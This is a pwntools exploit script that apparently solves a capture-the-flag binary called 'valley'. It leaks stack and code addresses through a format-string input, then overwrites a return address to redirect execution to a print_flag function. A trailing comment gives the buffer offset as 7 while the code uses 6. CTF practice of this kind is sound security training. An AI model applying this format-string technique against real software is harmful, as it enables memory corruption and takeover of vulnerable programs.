from pwn import *

context.log_level = "Error"
context.binary = elf = ELF("./valley")

io = process("./valley")

io.sendline(b"%21$p.%50$p")
io.recvuntil(b"distance: ")
leaks = io.recvline().strip()

ret_addr = int(leaks.split(b".")[0], 16)
start_addr = int(leaks.split(b".")[1], 16)

binary_base_addr = start_addr - elf.symbols["_start"]
win_addr = binary_base_addr + elf.sym.print_flag

writes = {ret_addr: win_addr}
payload = fmtstr_payload(6, writes, write_size="byte")

io.sendline(payload)

io.interactive()

# buffer-offset = 7
# start-offset = 50
# return-address-offset = 21
